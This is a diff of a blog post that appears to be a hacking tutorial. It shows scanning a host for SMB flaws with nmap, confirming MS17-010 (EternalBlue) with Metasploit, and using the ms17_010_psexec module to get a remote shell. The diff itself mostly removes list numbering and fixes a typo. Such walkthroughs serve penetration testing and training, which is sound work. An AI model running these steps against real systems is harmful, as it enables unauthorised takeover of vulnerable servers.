@@ -1,6 +1,6 @@
 ---
 layout: post
-title: How to find SMB vulnerabilities with nmap plus example ms17-010 
+title: How to find SMB vulnerabilities with nmap & exploiting ms17-010 
 featured-img: WannaCry-ransom
 categories: Guides nmap hacking ms17-010 smb1
 mathjax: true
@@ -8,22 +8,22 @@ mathjax: true
 
 ## How to use the Nmap Scripting Engine to test for SMB vulnerabilities: 
 
-1. Run `nmap --script  vuln -p139,445 192.168.0.18` from your terminal. Change 192.168.0.18 to your target's IP address.
+Run `nmap --script  vuln -p139,445 192.168.0.18` from your terminal. Change 192.168.0.18 to your target's IP address.
 
 ![example command](../assets/nmap/nmap1.jpg)
 
-2. The result is `Vulnerable` to ms17-010 or CVE-2017-0143 - AKA EternarlBlue which was used by the WannaCry ransomware. This exploit allows an attacker to gain full control of a server/computer hosting a share using SMBv1. 
+The result is `Vulnerable` to ms17-010 or CVE-2017-0143 - AKA EternalBlue which was used by the WannaCry ransomware. This exploit allows an attacker to gain full control of a server/computer hosting a share using SMBv1. 
 
 
 ## Exploiting the found vulnerability (ms17-010): 
 
-1. Open metasploit `msfconsole`
-2. type `search ms17-010`
+Open metasploit `msfconsole`
+type `search ms17-010`
 
 ![](../assets/nmap/msfconsole.jpg)
 
-3. As you can see, there are a few modules found. 
-4. Let's confirm our nmap finding with the metasploit scanner: 
+As you can see, there are a few modules found. 
+Let's confirm our nmap finding with the metasploit scanner: 
    
     `use scanner/smb/smb_ms17_010`
     
@@ -33,16 +33,16 @@ mathjax: true
     
 ![](../assets/nmap/smbms17010.png)
     
-5. We have now confirmed the machine is vulnerable and that it is a Windows Server 2008 R2.  
-6. If we go back to our list of modules, Metasploit has a few exploits available. 
+We have now confirmed the machine is vulnerable and that it is a Windows Server 2008 R2.  
+If we go back to our list of modules, Metasploit has a few exploits available. 
 
 ![](../assets/nmap/msfconsole.jpg)
 
-7. I tried All and `ms17_010_psexec` was the only successful one. The other were not compatible or immediately bluescreened the server. 
+I tried All and `ms17_010_psexec` was the only successful one. The other were not compatible or immediately bluescreened the server. 
 
 ![](../assets/nmap/disconnect.png)
 
-8. To use this exploit, type: 
+To use this exploit, type: 
     
     `use windows/smb/ms17_010_psexec` hit enter
     
@@ -52,7 +52,7 @@ mathjax: true
     
 ![](../assets/nmap/shell.png)
 
-9. We got a shell on the remote system. 
+We got a shell on the remote system. 
 
 From here you can escalate privileges if necessary: 
 
